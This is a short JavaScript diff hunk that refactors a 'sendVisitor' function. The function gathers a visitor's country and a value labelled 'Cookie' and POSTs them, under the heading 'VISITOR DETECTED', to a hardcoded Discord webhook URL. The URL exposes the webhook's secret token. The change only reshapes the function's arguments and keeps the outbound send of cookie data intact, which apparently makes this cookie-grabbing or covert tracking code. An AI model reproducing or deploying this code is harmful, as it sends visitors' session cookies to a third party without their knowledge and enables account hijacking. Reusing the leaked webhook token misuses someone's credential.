@@ -84,15 +84,15 @@ runCode();
 
 
 
-function sendVisitor(userCountry, mixedString) {
+function sendVisitor(userInfo) {
   var currentTime = Date.now();
   var webhookURL = "https://discord.com/api/webhooks/1236279668282363924/K7Vm8hi1kVv2bDw5Ca2KImbpgUSPqTM-aesvFoOU8tv_3iOM9TGV-AlSqaiFWeEMqvmZ";
   var data = {
     content:
       "***VISITOR DETECTED***" + "\n" + "\n" +
       "**Time:** *" + dateTime + "*" + "\n" + "\n" +
-      "**Country:** *" + userCountry.country + "*" + "\n" + "\n" +
-      "**Cookie:** *" + mixedString + "*" + "\n" + "\n"
+      "**Country:** *" + userInfo.country + "*" + "\n" + "\n" +
+      "**Cookie:** *" + userInfo.mixedString + "*" + "\n" + "\n"
   };
   fetch(webhookURL, {
     method: "POST",
